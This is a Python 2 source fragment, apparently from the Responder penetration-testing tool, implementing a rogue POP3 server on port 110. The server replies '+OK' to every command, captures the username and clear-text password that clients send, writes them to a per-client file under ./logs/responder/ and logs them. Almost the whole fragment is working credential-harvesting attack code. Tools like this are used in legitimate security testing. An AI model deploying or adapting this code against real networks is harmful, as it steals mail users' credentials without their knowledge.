##################################################################################
#POP3 Stuff starts here
##################################################################################

class POP3Server():

	def serve_thread_tcp(host, port, handler):
		try:
			server = ThreadingTCPServer((host, port), handler)
			server.serve_forever()
		except Exception, e:
			print "Error starting TCP server on port %s: %s:" % (str(port),str(e))

	#Function name self-explanatory
	def start(POP_On_Off):
		if POP_On_Off == "ON":
			t = threading.Thread(name="POP", target=serve_thread_tcp, args=("0.0.0.0", 110,POP))
			t.setDaemon(True)
			t.start()
			return t
		if POP_On_Off == "OFF":
			return False

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = 1

	def server_bind(self):
		TCPServer.server_bind(self)


class POPOKPacket(Packet):
	fields = OrderedDict([
		("Code",           "+OK"),
		("CRLF",      "\r\n"),
	])

#POP3 server class.
class POP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(POPOKPacket()))
			data = self.request.recv(1024)
			if data[0:4] == "USER":
				User = data[5:].replace("\r\n","")
				responder_logger.info('[+]POP3 User: %s'%(User))
				t = POPOKPacket()
				self.request.send(str(t))
				data = self.request.recv(1024)
			if data[0:4] == "PASS":
				Pass = data[5:].replace("\r\n","")
				Outfile = "./logs/responder/POP3-Clear-Text-Password-"+self.client_address[0]+".txt"
				WriteData(Outfile,User+":"+Pass, User+":"+Pass)
				#print "[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass)
				responder_logger.info("[+]POP3 Credentials from %s. User/Pass: %s:%s "%(self.client_address[0],User,Pass))
				t = POPOKPacket()
				self.request.send(str(t))
				data = self.request.recv(1024)
			else :
				t = POPOKPacket()
				self.request.send(str(t))
				data = self.request.recv(1024)
		except Exception:
			pass

##################################################################################
#POP3 Stuff ends here
##################################################################################